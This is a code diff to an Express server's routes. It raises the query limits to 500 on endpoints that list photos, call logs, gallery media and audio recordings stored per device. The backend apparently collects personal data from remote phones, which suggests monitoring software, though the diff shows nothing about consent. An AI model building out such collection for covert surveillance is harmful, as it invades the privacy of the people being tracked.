@@ -149,7 +149,7 @@ router.get('/photos/list/:deviceId', async (req, res) => {
           { base64: { $exists: true, $ne: null } },
           { r2Url: { $exists: true, $ne: null } }
         ]
-      }).sort({ createdAt: -1 }).limit(50).lean();
+      }).sort({ createdAt: -1 }).limit(500).lean();
       if (dbPhotos.length > 0) {
         res.json({ photos: dbPhotos });
         return;
@@ -283,7 +283,7 @@ router.get('/calls/list/:deviceId', async (req, res) => {
 
   if (isMongoConnected()) {
     try {
-      const dbCalls = await CallLogModel.find({ deviceId: devId }).sort({ timestamp: -1 }).limit(80).lean();
+      const dbCalls = await CallLogModel.find({ deviceId: devId }).sort({ timestamp: -1 }).limit(500).lean();
       if (dbCalls.length > 0) {
         res.json({ calls: dbCalls });
         return;
@@ -348,7 +348,7 @@ router.get('/gallery/list/:deviceId', async (req, res) => {
 
   if (isMongoConnected()) {
     try {
-      const dbMedia = await GalleryMediaModel.find({ deviceId: devId }).sort({ timestamp: -1 }).limit(100).lean();
+      const dbMedia = await GalleryMediaModel.find({ deviceId: devId }).sort({ timestamp: -1 }).limit(500).lean();
       if (dbMedia.length > 0) {
         res.json({ media: dbMedia });
         return;
@@ -574,7 +574,7 @@ router.get('/audio/list/:deviceId', async (req, res) => {
 
   if (isMongoConnected()) {
     try {
-      const dbAudios = await AudioModel.find({ deviceId: devId }).sort({ createdAt: -1 }).limit(50).lean();
+      const dbAudios = await AudioModel.find({ deviceId: devId }).sort({ createdAt: -1 }).limit(500).lean();
       if (dbAudios.length > 0) {
         res.json({ audioList: dbAudios });
         return;
